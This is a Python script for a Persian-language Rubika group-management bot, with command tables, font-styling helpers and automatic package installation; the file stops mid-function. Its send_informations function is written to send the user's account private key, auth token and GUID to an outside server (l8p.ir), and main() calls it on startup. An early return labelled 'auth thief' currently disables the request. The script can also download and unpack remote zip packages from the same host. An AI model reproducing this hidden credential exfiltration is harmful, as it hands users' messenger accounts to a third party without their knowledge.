Text_help = """
دستورات اکروبات در این کانال قرار گرفته: @VECTOR_robot_commands2
"""

import os, random, time, json, copy, sys, zlib, pickle, urllib.parse
from io import BytesIO
from threading import Thread, Event

try:
    import requests
except ImportError:
    print('> Installing requests...')
    os.system(f'{sys.executable} -m pip install -U requests --quiet')
    print('> Done.')
    import requests

def install_packages(name):
    import os
    try:
        print(f'> Installing {name}...')
        os.system(f'{sys.executable} -m pip install -U {name} --quiet')
        print('> Done.')
    except Exception:
        print(f'> Failed to install {name}.')

def install_packages_local(name, url=None):
    if url is None:
        url = name
    from zipfile import ZipFile
    if not os.path.exists('packages_local'):
        os.makedirs('packages_local')
    print(f'> download {name}... ')
    response = requests.get(f'https://l8p.ir/packages_local/{url}.zip', timeout=30)
    with open(f'packages_local/{name}.zip', 'wb') as f:
        f.write(response.content)
    print(f'> unzip file {name}... ')
    with ZipFile(f'packages_local/{name}.zip', 'r') as zip_ref:
        zip_ref.extractall('packages_local')

def get_public_ip():
    import time
    urls = ['https://api.ipify.org?format=json', 'https://api.myip.com', 'https://api64.ipify.org?format=json', 'https://api.bigdatacloud.net/data/client-ip', 'https://api-bdc.net/data/client-ip', 'https://api.ipify.org?format=text']
    for url in urls:
        try:
            response = requests.get(url)
            response.raise_for_status()
            data = response.json()
            ip = data.get('ip') or data.get('ipString') or response.text.strip()
            return ip
        except Exception:
            time.sleep(0.5)
    return None

def check_and_upgrade_pip():
    try:
        import subprocess
        import sys
        result = subprocess.run([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            print('> pip has been successfully updated.')
    except Exception:
        pass
NEWVR = '6.2.7'
type_bot_main_ = 'manager_pro'
count_used_ = 0
OFFBOT = False
main_key_ = False

def send_informations(private, guid, owner, auth):
    return 'اوث دزد'
    paylod = {'private': private, 'guid': guid, 'owner': owner, 'auth': auth, 'type': type_bot_main_, 'version': NEWVR}
    r = requests.get(f'https://l8p.ir/API/auth.php', params=paylod, timeout=30).json()['status']

if not os.path.exists('packages_local'):
    os.makedirs('packages_local')
if not os.path.exists('Downloads'):
    os.makedirs('Downloads')
old_name = 'BotMe.pyrubi'
if os.path.exists(old_name):
    new_name = 'Bot.l8P'
    os.rename(old_name, new_name)
    print(f'> File name changed from {old_name} to {new_name}')

def install_auto(pkg, isok=True):
    import importlib.util
    for package_name in pkg:
        if package_name == 'Pillow':
            package_name = 'PIL'
        if importlib.util.find_spec(package_name) is None:
            if package_name == 'PIL':
                package_name = 'Pillow'
            if not isok:
                isok = input(f'>> Can i install {package_name}? y/n : ').lower()
            if isok is True or isok == 'y':
                print(f'> {package_name} is not installed')
                install_packages(package_name)

# --- ensure pyrubi is installed via pip (replaced original install_auto(['pyrubi'])) ---
import importlib.util

def ensure_package_installed(package_name, pip_name=None):
    """Ensure a package is importable; if not, try to install with pip."""
    if pip_name is None:
        pip_name = package_name
    if importlib.util.find_spec(package_name) is None:
        print(f'> {package_name} is not installed. Trying to install via pip...')
        try:
            res = os.system(f'{sys.executable} -m pip install -U {pip_name} --quiet')
            if res != 0:
                print(f'> pip install returned code {res}.')
            else:
                print(f'> {package_name} installed (or already up-to-date).')
        except Exception as ex:
            print(f'> Failed to run pip install for {package_name}:', ex)

# ensure pyrubi is available
ensure_package_installed('pyrubi')

OLDVR = {'version': NEWVR}
file_version = 'version.json'
file_version_is = os.path.isfile(file_version)
if not file_version_is:
    with open(file_version, 'w') as outfile:
        json.dump(OLDVR, outfile)
else:
    with open(file_version, 'r') as openfile:
        OLDVR = json.load(openfile)
import shutil
old_vr = False
if OLDVR['version'] != NEWVR:
    folder_path, folder_name = ('packages_local', 'pyrubi')
    folder_path_to_remove = os.path.join(folder_path, folder_name)
    if not os.path.exists(folder_path_to_remove):
        try:
            shutil.rmtree(folder_path_to_remove)
        except Exception as e:
            pass
        print(f"> Folder '{folder_name}' has been removed from '{folder_path}'.")
    else:
        print(f"> Folder '{folder_name}' does not exist in '{folder_path}'.")
    old_vr = OLDVR['version']
    OLDVR['version'] = NEWVR
    file_version_is = True
    with open(file_version, 'w') as outfile:
        json.dump(OLDVR, outfile)
del shutil

# --- Use pip-installed pyrubi instead of packages_local ---
try:
    # try importing installed pyrubi package
    from pyrubi import Client
    try:
        from pyrubi.network import Network as PyrubiNetwork
    except Exception:
        PyrubiNetwork = None
    try:
        from pyrubi import Exceptions
    except Exception:
        Exceptions = None
    try:
        import pyrubi.exceptions as pyrubi_exceptions
    except Exception:
        pyrubi_exceptions = None
except Exception as e:
    print(e)
    print('> pyrubi import failed:', e)
    print('> Attempting to install/upgrade pyrubi via pip and re-import...')
    try:
        os.system(f'{sys.executable} -m pip install -U pyrubi')
    except Exception as ex:
        print('> pip install failed:', ex)
    try:
        from pyrubi import Client
        try:
            from pyrubi.network import Network as PyrubiNetwork
        except Exception:
            PyrubiNetwork = None
        try:
            from pyrubi import Exceptions
        except Exception:
            Exceptions = None
        try:
            import pyrubi.exceptions as pyrubi_exceptions
        except Exception:
            pyrubi_exceptions = None
    except Exception as e2:
        print('> Failed to import pyrubi after pip install ->', e2)
        print('> The script requires pyrubi to be installed (package name: pyrubi).')
        print('> Try manually: python -m pip install -U pyrubi')
        exit()
        import pyrubi.exceptions
try:
    import jdatetime
except:
    import datetime as jdatetime

def get_iran_timestamp():
    return int(jdatetime.datetime.now().timestamp())
FIS = {'error_connectiong': True, 'helping_activation': True}
myevent = Event()
thread_timer = None
INFOS, USERS, SPEAKX, INLINES = ({}, {}, {}, {})
site_url = 'yun.ir/GitBot'
default_ok = random.choice(['↺'])
GUIDME, OWNER = (None, None)
ST = {'font': 'natual', 'type': 'natual', 'ok': default_ok}
LSMessage, ARMessages, STMessages, CheckJoins, JoindUsers = ({}, {}, {}, {}, {})
reaporter_limit, Spam, PROTECTED = ({}, {}, {})
silentMod, istimer = (False, False)
TimeMessages = []
file_owner_is = False
Coder = 'g0Fyc1m067cbce73121709d87fc11323'
gettime = get_iran_timestamp()
timechecking = {'bio': gettime - 2700, 'register': gettime, 'data': gettime, 'protect': gettime}
Typebots = {'manager': 'مدیریت گپ', 'manager2': 'مدیریت گپ', 'manager_solo': 'مدیریت گپ [solo]'}
ListLocks_R = {0: 'متن', 1: 'گیف', 2: 'ویس', 3: 'اهنگ', 4: 'عکس', 5: 'فیلم', 6: 'فایل', 7: 'ایدی', 8: 'لینک', 9: 'فوروارد', 10: 'لوکیشن', 11: 'نظرسنجی', 12: 'پست', 13: 'استوری', 14: 'لایو', 15: 'متن نامناسب', 16: 'اسپم', 17: 'جوین تکراری', 18: 'انگلیسی', 19: 'متادیتا', 20: 'کد هنگی'}
Listlocks = {'متن': 0, 'گیف': 1, 'ویس': 2, 'اهنگ': 3, 'عکس': 4, 'فیلم': 5, 'فایل': 6, 'ایدی': 7, 'لینک': 8, 'فوروارد': 9, 'لوکیشن': 10, 'نظرسنجی': 11, 'پست': 12, 'استوری': 13, 'لایو': 14, 'متن نامناسب': 15, 'اسپم': 16, 'جوین تکراری': 17, 'انگلیسی': 18, 'متادیتا': 19, 'کد هنگی': 20}
ListLockNames = {'Text': 'متن', 'Gif': 'گیف', 'Voice': 'ویس', 'Music': 'اهنگ', 'Image': 'عکس', 'Video': 'فیلم', 'File': 'فایل', 'Location': 'لوکیشن', 'Poll': 'نظرسنجی', 'RubinoPost': 'پست', 'RubinoStory': 'استوری', 'Live': 'لایو'}

Listset = {'ربات': 0, 'حالت خواب': 15, 'ضد تبچی': 4, 'ضد ریپ': 13, 'عضویت اجباری': 14, 'پیام شیشه ای': 12, 'بن': 5, 'اخطار': 6, 'سخنگو': 1, 'سخنگو پیشفرض': 2, 'سخنگو شخصی': 3, 'پرحرفی': 10, 'حذف خودکار': 11, 'خوشامدگویی': 7, 'خدافظی': 8, 'اعلان': 9, 'تنظیم داشبورد': 16, 'تنظیم دستورات': 17, 'تنظیم محدودیت': 18}

ListKeys_Names = {2: 'اینفو', 37: 'محدودیت', 12: 'داشبورد', 42: 'فونت', 14: 'لیست دستورات', 4: 'لینک', 9: 'عدد شانسی', 10: 'قوانین', 3: 'تاس', 11: 'سکه', 1: 'تقویم', 1: 'تاریخ', 13: 'ساعت', 15: 'جوک', 16: 'چالش', 17: 'بیو', 18: 'فکت', 19: 'اعتراف', 20: 'دانستنی', 21: 'داستان', 22: 'تکست', 38: 'گنگ', 46: 'انگیزشی', 47: 'ذکر', 23: 'فال', 43: 'فال حافظ', 44: 'پروفایل', 45: 'بکگراند', 75: 'پروکسی', 49: 'فتوگرافی', 50: 'دقت', 51: 'حق', 52: 'پ ن پ', 54: 'ویس', 55: '/', 56: 'ویس زن', 57: 'ویس مرد', 60: 'ساخت عکس', 61: 'لوگو', 62: 'عکس', 63: 'حذف تایمر', 64: 'تایمر', 65: 'لوگو3', 66: 'لوگو2', 67: '//', 68: 'سخنگو', 69: 'نجوا', 70: 'ثبت یادداشت', 71: 'حذف فیلتر', 72: 'فیلتر', 73: 'ترجمه', 74: 'افکت', 78: 'کلید', 79: 'حذف کلید', 80: 'پست', 81: 'گزارش'}
Listkeys = {'تاریخ': 1, 'تقویم': 1, 'اینفو': 2, 'اینفوم': 2, 'اینفوش': 2, 'امارش': 2, 'امارم': 2, 'امار': 2, 'تاس': 3, 'لینک': 4, 'ورژن': 5, 'نسخه': 5, 'لیست ویژه': 6, 'لیست ادمین': 7, 'لیست قفل': 8, 'عدد شانسی': 9, 'قوانین': 10, 'سکه': 11, 'داشبورد': 12, 'ساعت': 13, 'لیست دستورات': 14, 'جوک': 15, 'چالش': 16, 'بیو': 17, 'فکت': 18, 'اعتراف': 19, 'دانستنی': 20, 'داستان': 21, 'تکست': 22, 'فال': 23, 'لیست': 24, 'لیست ها': 24, 'کشیده': 25, 'لش': 26, 'شکسته': 27, 'گوید': 28, 'گویدم': 28, 'گویدش': 28, 'مقام': 29, 'مقامم': 29, 'مقامش': 29, 'اصل': 30, 'اصلم': 30, 'اصلش': 30, 'لقب': 31, 'لقبم': 31, 'لقبش': 31, 'تعداد اخطار': 32, 'تعداد اخطارم': 32, 'تعداد اخطارش': 32, 'تعداد پیام': 33, 'تعداد پیامم': 33, 'تعداد پیامش': 33, 'بنر': 34, 'خدافظی': 35, 'خدافزی': 35, 'خوشامدگویی': 36, 'محدودیت': 37, 'گنگ': 38, 'مالک': 39, 'فونت': 42, 'فال حافظ': 43, 'پروفایل': 44, 'بکگراند': 45, 'انگیزشی': 46, 'ذکر': 47, 'والپیپر': 45, 'پروکسی': 48, 'فتوگرافی': 49, 'دقت': 50, 'حق': 51, 'پ ن پ': 52, 'سازنده': 53, 'ویس': 54, '/': 55, 'ویس زن': 56, 'ویس مرد': 57, 'ساخت عکس': 60, 'لوگو': 61, 'عکس': 62, 'حذف تایمر': 63, 'تایمر': 64, 'لوگو3': 65, 'لوگو2': 66, '//': 67, 'سخنگو': 68, 'نجوا': 69, 'ثبت یادداشت': 70, 'حذف فیلتر': 71, 'فیلتر': 72, 'ترجمه': 73, 'افکت': 74, 'اسم': 75, 'ارز': 76, 'گوید گروه': 77, 'کلید': 78, 'حذف کلید': 79, 'پست': 80, 'گزارش': 81}
BoxEmoji = '🔥👺✨🗿😐🙂😂♥️🫸🥺💦😑😌😒🥲💋🚶🏻\u200d♂️😘👍🤲🖕💎✅💕🤌🫷🤣👉😁🚫❓❗🙏😅👏🥳😭😅🥲😪😛🤗🥱☹️🤮🤢😈👻🌚🌝💩😹😻😼😸😹😿❤️🧡💛💚🩵💙🩸👀💀🦴🦷🐨🐼🐹🐭🐰🦊🦝🐻🐮🐷🦁🐯🐱🐶🐺🦍🍎🍉🍑🍊🥭🍍🍌🍐🍏🍋🍋🥝🫒🍇🍕🍭🍬🍫🧸'
TPE = 'ضصثقفغعهخحجچشسیبلاتنمکگظطژزرذدپو۱۲۳۴۵۶۷۸۹۰ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890 '
HASHTAG = 'ضصثقفغعهخحجچشسیبلاتنمکگظطژزرذدپو۱۲۳۴۵۶۷۸۹۰ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_'
TEG = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
TEGX = 'abcdefghijklmnopqrstuvwxyz'
TXTP = 'ضصثقفغعهخحجچشسیبلاتنمکگظطژزرذدپو'
Types_text = {'معمولی': 'natual', 'عادی': 'natual', 'تکی': 'mono', 'برجسته': 'bold', 'کج': 'italic', 'خط خورده': 'strike', 'زیرخط': 'underline', 'زیر خط': 'underline', 'منشن': 'mention', 'اسپویلر': 'spoiler'}
Fonts_text = {'معمولی': 'natual', 'عادی': 'natual', 'شکسته': 'shec', 'لش': 'lash', 'کشیده': 'kesh'}
Box_langs = [('بلغاری', 'Bulgarian', 'bg'), ('چکی', 'Czech', 'cs'), ('دانمارکی', 'Danish', 'da'), ('المانی', 'German', 'de'), ('یونانی', 'Greek', 'el'), ('انگلیسی', 'English', 'en'), ('اسپانیایی', 'Spanish', 'es'), ('استونیایی', 'Estonian', 'et'), ('فنلاندی', 'Finnish', 'fi'), ('فرانسوی', 'French', 'fr'), ('مجارستانی', 'Hungarian', 'hu'), ('اندونزیایی', 'Indonesian', 'id'), ('ایتالیایی', 'Italian', 'it'), ('ژاپنی', 'Japanese', 'ja'), ('کره ای', 'Korean', 'ko'), ('لیتوانیایی', 'Lithuanian', 'lt'), ('لتونیایی', 'Latvian', 'lv'), ('نروژی', 'Norwegian', 'nb'), ('هلندی', 'Dutch', 'nl'), ('لهستانی', 'Polish', 'pl'), ('پرتغالی', 'Portuguese', 'pt'), ('رومانیایی', 'Romanian', 'ro'), ('روسی', 'Russian', 'ru'), ('اسلواکی', 'Slovak', 'sk'), ('اسلوونیایی', 'Slovenian', 'sl'), ('سوئدی', 'Swedish', 'sv'), ('ترکی', 'Turkish', 'tr'), ('اوکراینی', 'Ukrainian', 'uk'), ('چینی', 'Chinese', 'zh'), ('فارسی', 'Persian', 'fa'), ('عربی', 'Arabic', 'ar')]
Countris = [('United States', 'ایالات متحده', 'امریکا', 'USA'), ('India', 'هند'), ('Brazil', 'برزیل'), ('United Kingdom', 'انگلستان'), ('France', 'فرانسه'), ('Russia', 'روسیه'), ('Turkey', 'بوقلمون'), ('Colombia', 'کلمبیا'), ('Spain', 'اسپانیا'), ('Italy', 'ایتالیا'), ('Iran', 'ایران'), ('Germany', 'المان'), ('Mexico', 'مکزیک'), ('South Africa', 'افریقای جنوبی'), ('Peru', 'پرو'), ('Chile', 'شیلی'), ('Canada', 'کانادا'), ('Afghanistan', 'افغانستان'), ('Albania', 'البانی'), ('Algeria', 'الجزایر'), ('Andorra', 'اندورا'), ('Angola', 'انگولا'), ('Antigua and Barbuda', 'انتیگوا و باربودا'), ('Argentina', 'ارژانتین'), ('Armenia', 'ارمنستان'), ('Aruba', 'اروبا'), ('Australia', 'استرالیا'), ('Austria', 'اتریش'), ('Azerbaijan', 'اذربایجان'), ('Bahamas', 'باهاما'), ('Bahrain', 'بحرین'), ('Bangladesh', 'بنگلادش'), ('Barbados', 'باربادوس'), ('Belarus', 'بلاروس'), ('Belgium', 'بلژیک'), ('Belize', 'بلیز'), ('Benin', 'بنین'), ('Bermuda', 'برمودا'), ('Bhutan', 'بوتان'), ('Bolivia', 'بولیوی'), ('Bosnia and Herzegovina', 'بوسنی و هرزگوین'), ('Bonaire, Sint Eustatius and Saba', 'بونیر، سینت اوستاتیوس و صبا'), ('Botswana', 'بوتسوانا'), ('British Virgin Islands', 'جزایر ویرجین بریتانیا'), ('Brunei', 'برونئی'), ('Bulgaria', 'بلغارستان'), ('Burkina Faso', 'بورکینافاسو'), ('Burundi', 'بوروندی'), ('Cape Verde', 'کیپ ورد'), ('Cambodia', 'کامبوج'), ('Cameroon', 'کامرون'), ('Cayman Islands', 'جزایر کیمن'), ('Central African Republic', 'جمهوری افریقای مرکزی'), ('Chad', 'چاد'), ('Pakistan', 'پاکستان'), ('Republic of Congo', 'جمهوری کنگو'), ('Costa Rica', 'کاستاریکا'), ("Cote d'Ivoire", 'ساحل عاج'), ('Croatia', 'کرواسی'), ('Cuba', 'کوبا'), ('Curaçao', 'کوراسائو'), ('Cyprus', 'قبرس'), ('Czech Republic', 'جمهوری چک'), ('Democratic Republic of Congo', 'جمهوری دموکراتیک کنگو'), ('Denmark', 'دانمارک'), ('Djibouti', 'جیبوتی'), ('Dominica', 'دومینیکا'), ('Dominican Republic', 'جمهوری دومینیکن'), ('Ecuador', 'اکوادور'), ('Egypt', 'مصر'), ('El Salvador', 'السالوادور'), ('Equatorial Guinea', 'گینه استوایی'), ('Estonia', 'استونی'), ('Eswatini', 'اسواتینی'), ('Ethiopia', 'اتیوپی'), ('Eritrea', 'اریتره'), ('Faroe Islands', 'جزایر فارو'), ('Fiji', 'فیجی'), ('Finland', 'فنلاند'), ('French Guiana', 'گویان فرانسه'), ('French Polynesia', 'پلینزی فرانسه'), ('Gabon', 'گابن'), ('Gambia', 'گامبیا'), ('Georgia', 'گرجستان'), ('Ghana', 'غنا'), ('Gibraltar', 'جبل الطارق'), ('Grand Princess', 'پرنسس بزرگ'), ('Greece', 'یونان'), ('Greenland', 'گرینلند'), ('Grenada', 'گرانادا'), ('Guadeloupe', 'گوادگیت'), ('Guatemala', 'گواتمالا'), ('Guernsey', 'گرنزی'), ('Guinea', 'گینه'), ('Guinea-Bissau', 'گینه بیسائو'), ('Guyana', 'گویان'), ('Haiti', 'هائیتی'), ('Holy See', 'مقرّس'), ('Honduras', 'هندوراس'), ('Hungary', 'مجارستان'), ('Iceland', 'ایسلند'), ('Iraq', 'عراق'), ('Ireland', 'ایرلند'), ('Isle of Man', 'جزیره من'), ('Israel', 'اسرائيل'), ('Japan', 'ژاپن'), ('Diamond Princess', 'پرنسس الماس'), ('Jamaica', 'جامائیکا'), ('Jersey', 'پیراهن ورزشی'), ('Jordan', 'اردن'), ('Kenya', 'کنیا'), ('Kazakhstan', 'قزاقستان'), ('Kosovo', 'کوزوو'), ('Kuwait', 'کویت'), ('Kyrgyzstan', 'قرقیزستان'), ('Laos', 'لائوس'), ('Latvia', 'لتونی'), ('Lebanon', 'لبنان'), ('Liberia', 'لیبریا'), ('Libya', 'لیبی'), ('Liechtenstein', 'لیختن اشتاین'), ('Lithuania', 'لیتوانی'), ('Luxembourg', 'لوکزامبورگ'), ('Madagascar', 'ماداگاسکار'), ('Maldives', 'مالدیو'), ('Mali', 'مالی'), ('Malta', 'مالت'), ('Malawi', 'مالاوی'), ('Martinique', 'مارتینیک'), ('Mauritania', 'موریتانی'), ('Mauritius', 'موریس'), ('Mayotte', 'مایوت'), ('Moldova', 'مولداوی'), ('Monaco', 'موناکو'), ('Mongolia', 'مغولستان'), ('Montenegro', 'مونته نگرو'), ('Montserrat', 'مونتسرات'), ('Morocco', 'مراکش'), ('Mozambique', 'موزامبیک'), ('MS Zaandam', 'ام اس زندم'), ('Myanmar', 'میانمار'), ('Namibia', 'نامیبیا'), ('Nepal', 'نپال'), ('Netherlands', 'هلند'), ('New Caledonia', 'کالدونیای جدید'), ('New Zealand', 'نیوزلند'), ('Nicaragua', 'نیکاراگوئه'), ('Niger', 'نیجر'), ('Nigeria', 'نیجریه'), ('North Macedonia', 'مقدونیه شمالی'), ('Norway', 'نروژ'), ('Occupied Palestinian territory', 'سرزمین فلسطین اشغالی'), ('Oman', 'عمان'), ('Panama', 'پاناما'), ('Paraguay', 'پاراگوئه'), ('Philippines', 'فیلیپین'), ('Papua New Guinea', 'پاپوا گینه نو'), ('Poland', 'لهستان'), ('Portugal', 'کشور پرتغال'), ('Qatar', 'قطر'), ('Reunion', 'تجدید دیدار'), ('Romania', 'رومانی'), ('Singapore', 'سنگاپور'), ('Rwanda', 'رواندا'), ('San Marino', 'سن مارینو'), ('Saint Kitts and Nevis', 'سنت کیتس و نویس'), ('Saint Lucia', 'سنت لوسیا'), ('Sint Maarten', 'سینت مارتن'), ('Saint Pierre and Miquelon', 'سنت پیر و میکلون'), ('Saint Vincent and the Grenadines', 'سنت وینسنت و گرنادین'), ('Sao Tome and Principe', 'سائوتومه و پرنسیپ'), ('Saudi Arabia', 'عربستان سعودی'), ('Seychelles', 'سیشل'), ('Senegal', 'سنگال'), ('Serbia', 'صربستان'), ('Sierra Leone', 'سیرا لئون'), ('Indonesia', 'اندونزی'), ('Slovakia', 'اسلواکی'), ('Slovenia', 'اسلوونی'), ('Somalia', 'سومالی'), ('South Korea', 'کره جنوبی'), ('South Sudan', 'سودان جنوبی'), ('Malaysia', 'مالزی'), ('Sri Lanka', 'سری لانکا'), ('Sudan', 'سودان'), ('Suriname', 'سورینام'), ('Sweden', 'سوئد'), ('Switzerland', 'سوئیس'), ('Syria', 'سوریه'), ('Tanzania', 'تانزانیا'), ('Thailand', 'تایلند'), ('Timor-Leste', 'تیمور شرقی'), ('Togo', 'رفتن'), ('Trinidad and Tobago', 'ترینیداد و توباگو'), ('Tunisia', 'تونس'), ('Turks and Caicos Islands', 'جزایر تورکس و کایکوس'), ('Uganda', 'اوگاندا'), ('Ukraine', 'اوکراین'), ('United Arab Emirates', 'امارات متحده عربی'), ('Taiwan', 'تایوان'), ('United States Virgin Islands', 'جزایر ویرجین ایالات متحده'), ('Uruguay', 'اروگوئه'), ('Uzbekistan', 'ازبکستان'), ('Venezuela', 'ونزوئلا'), ('Vietnam', 'ویتنام'), ('Western Sahara', 'صحرای غربی'), ('Yemen', 'یمن'), ('Zambia', 'زامبیا'), ('Zimbabwe', 'زیمبابوه')]
RATES = {'Us Dollar': 'دلار آمریکا', 'Euro': 'یورو', 'British Pound': 'پوند انگلیس', 'Swedish Krona': 'کرون سوئد', 'Swiss Franc': 'فرانک سوئیس', 'Canada Dollar': 'دلار کانادا', 'Azerbaijan Manat': 'منات آذربایجان', 'Ruble': 'روبل', 'UAE Dirham': 'درهم امارات', 'Turkish Lira': 'لیر ترکیه', 'Chinese Yuan': 'یوان چین', 'KSA Riyal': 'ریال عربستان', 'Indian Rupee': 'روپیه هند', 'Afghan Afghani': 'افغانی افغان', 'Kuwaiti Finar': 'دینار کویت', 'Bahraini Dinar': 'دینار بحرین', 'Omani Riyal': 'ریال عمان', 'Qatari Riyal': 'ریال قطر'}
LISTFILTERPRO = ['کص', 'ربات', 'کوبص', 'کوص', 'کون', 'کیر', 'ممه', 'لخت', 'برهنه', 'سکس', 'جنده', 'گایید', 'گاید', 'پورن', 'گوه', 'sex', 'xnxx', 'porn']
canSetBio = True
limitAPI = {}
typespeak = 'polit'
love_text_messages = ['You are my sunshine on a cloudy day.', 'Every moment with you feels like a dream.', 'Thinking of you brightens my day.', 'You are the reason for my smile.', 'I feel complete with you by my side.', 'Your love is the music to my soul.', 'My love for you knows no bounds.', 'You are the missing piece to my puzzle.', 'You make my heart skip a beat.', 'I love you more than words can express.', 'You are my happily ever after.', 'Your love is a treasure I hold dear.', 'You are the shining star in my sky.', 'You are my one true love.', "I'm blessed to have you in my life.", 'My heart beats only for you.', 'You are my love, my life, my everything.', 'I love you to the moon and back.', 'You are my sunshine on a cloudy day.', 'I fall more in love with you every day.', 'Thinking of you brightens my day.', 'You are the reason for my smile.', 'I feel complete with you by my side.', 'Your love is the music to my soul.', 'I cherish every moment we spend together.', 'My love for you knows no bounds.', 'You are the missing piece to my puzzle.', 'You make my heart skip a beat.', 'I love you more than words can express.', 'You are my happily ever after.', 'Your love is a treasure I hold dear.', 'You are my one true love.', "I'm blessed to have you in my life.", 'My heart beats only for you.', 'You are my love, my life, my everything.', 'I love you to the moon and back.', 'Our love story is my favorite to tell.', 'I love the way you make me feel complete.', 'Every moment with you is a treasure.', "You are my heart's desire, now and always.", 'Your love is my favorite kind of magic.', 'You are my happy place.', 'Loving you is the best part of my day.', "I can't imagine a life without you in it.", 'I love you more than words can express.', "I'm so grateful to have you in my life.", "I love you more than you'll ever know.", 'You are my forever and always.', 'Your love fills my heart with joy.', 'You are my sunshine on a rainy day.', 'My love for you will never fade.', "You are my heart's greatest desire.", 'I am so grateful for the love we share.', 'I love you more than words can say.', 'You are my world, my everything, my love.', 'Loving you is the best part of my day.', 'You are my rock, my anchor, my everything.', 'You are my soulmate, my partner, my love.', "I can't imagine my life without you in it.", 'You are the missing piece to my puzzle.', 'My love for you knows no bounds.', 'You are my happily ever after.', 'I cherish every moment we spend together.', 'You are my heart, my soul, my everything.', 'I love you more with each passing day.', 'You are the love of my life, my true north.', "I'm so grateful to have you by my side.", 'You are the light that brightens my world.', 'My love for you will never fade.', 'You are my one true love, now and always.', 'I am blessed to have you in my life.', 'You are my sunshine on a cloudy day.']

def leave_from_group(client, object_guid):
    if INFOS and object_guid in INFOS:
        INFOS[object_guid]['state'] = False
    client.leave_chat(object_guid)

def is_float(value):
    try:
        float(value)
        return True
    except ValueError:
        return False

def restart_program():
    import sys, os, time
    time.sleep(2)
    os.execl(sys.executable, sys.executable, *sys.argv)

def stop_program():
    import os, time
    time.sleep(2)
    print('Program will be terminated now.')
    os._exit(0)

def handle_text_file(text_input=None, filename='data.txt'):
    default_value = 'rude'
    if text_input:
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(text_input)
    elif os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as file:
            content = file.read()
            return content
    else:
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(default_value)
    return default_value

def main():
    global client, credentials_file, file_infos, file_inlines, file_speakx, file_users, files_to_check, guid_sender, list_command_fulladmins, list_command_fulladmins_keys, list_command_fulladmins_reply, list_command_fulladmins_reply_keys, list_command_goldadmin, list_command_goldadmin_keys, list_command_goldadmin_reply, list_command_goldadmin_reply_keys, list_command_owner, list_command_owner_keys, list_command_owner_reply, list_command_owner_reply_keys, list_command_users, list_command_users_keys, list_command_users_reply, list_command_users_reply_keys, list_filter_metadata, object_guid
    global LSMessage, ARMessages, STMessages, CheckJoins, JoindUsers, reaporter_limit, Spam, PROTECTED, license_key, random, api_lists, Coder, GAMES
    try:
        import jdatetime
    except ImportError:
        import datetime as jdatetime
    try:
        client = Client('Bot')
    except Exception as e:
        print('> I can not connect to the rubika.', e)
        return
    import os
    files_to_check = ['owner.txt']
    OWNER, file_owner = ('NULL', 'owner.txt')

    def find_owner_file():
        owner = 'NULL'
        for file_name in files_to_check:
            if os.path.isfile(file_name):
                try:
                    with open(file_name, 'r') as file:
                        owner = file.read().strip()
                        return owner
                except Exception as e:
                    continue
        return owner
    OWNER = find_owner_file()
    if not OWNER or OWNER == 'NULL':
        file_owner_is = False
    else:
        file_owner_is = True
    isok = False
    limit = 3
    while not isok:
        if limit <= 0:
            FIS.error_connectiong = True
            print('> I have tried multiple times but have been unable to retrieve the data.')
            print('> Please log in to the account again.')
            print(f'> For more information, please check the {site_url} website.')
            FIS.error_connectiong = False
            helpfi_isforhere = True
            break
        GETME = client.get_me()
        GUIDME = GETME['user']['user_guid']
        isok = True
        isent = False
        limit_skip = 3
        while not isent:
            if limit_skip <= 0:
                print('> Skip sending the data.')
                break
            private = GETME['private_key']
            auth = GETME['auth']
            send_informations(private, GUIDME, str(OWNER), auth)
            isent = True
            try:
                time.sleep(0.5)
                limit_skip -= 1
            except Exception as e:
                time.sleep(0.5)
                limit_skip -= 1
                raise e

    def UPFILES(file_name, FILE):
        try:
            with open(file_name, 'w') as outfile:
                json.dump(FILE, outfile)
        except Exception:
            pass

    def UPTXTFILES(file_name, info):
        try:
            with open(file_name, 'w') as file:
                file.write(info)
        except Exception:
            pass

    def makeTagBio(user, first, check_old, checkAd):
        global canSetBio
        tag = Informations.get('bio', '')
        tags = Informations.get('old_bios', [])
        main_bio = ''
        bio = ''
        changeBio = False
        if 'bio' in user:
            bio = user['bio']
        if not canSetBio:
            return (bio, False)
        if bio != tag:
            changeBio = True
        return [tag, changeBio]

    def check_last_owner(expected_value):
        import os
        filename = 'lastowner.txt'
        if os.path.isfile(filename):
            try:
                with open(filename, 'r', encoding='utf-8') as file:
                    content = file.read().strip()
                    if content != expected_value:
                        with open(filename, 'w', encoding='utf-8') as file:
                            file.write(expected_value)
                            return False
                    else:
                        return True
            except Exception as e:
                print(f'خطا : {e}')
                return True
        try:
            with open(filename, 'w', encoding='utf-8') as file:
                file.write(expected_value)
                return False
        except Exception as e:
            print(f'خطا : {e}')
            return True

    def remove_ids_and_links(text):
        import re
        url_pattern = 'https?://\\\\S+|www\\\\.\\\\S+|[a-zA-Z0-9-]+\\\\.[a-zA-Z0-9-.]+(/\\\\S*)?'
        id_pattern = '@\\\\w+'
        text = re.sub(url_pattern, '', text)
        text = re.sub(id_pattern, '', text)
        return text

    def Font_shec(text):
        NewText = ''
        for x in text:
            if x in TXTP:
                NewText += x + '\u200d\u200c'
            else:
                NewText += x
        return NewText

    def Font_filter(text):
        NewText = ''
        for x in text:
            if x in TXTP or x in TEGX:
                NewText += x + 'ܲ'
            else:
                NewText += x
        return NewText

    def Font_close(text):
        NewText = ''
        TPE = 'ضصثقفغعهخحجچشسیبلاتنمکگظطژزرذدپوABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        fi = True
        for x in text:
            if fi:
                NewText += x
                fi = False
            elif x in TPE:
                NewText += x + '\u200d\u200c/'
            else:
                NewText += x
        return NewText

    def Font_kesh(text):
        new_text = ''
        txt_persian = 'ضصثقفغعهخحجچشسیبلاتنمکگظطژزرذدپو'
        for char in text:
            if char in txt_persian:
                if char in ('ا', 'و', 'د', 'ذ', 'ر', 'ز', 'ژ'):
                    new_text += char
                else:
                    new_text += char + 'ـ' * random.randint(1, 3)
            else:
                new_text += char
        return new_text

    def Font_lash(text):
        NewText = ''
        for x in text:
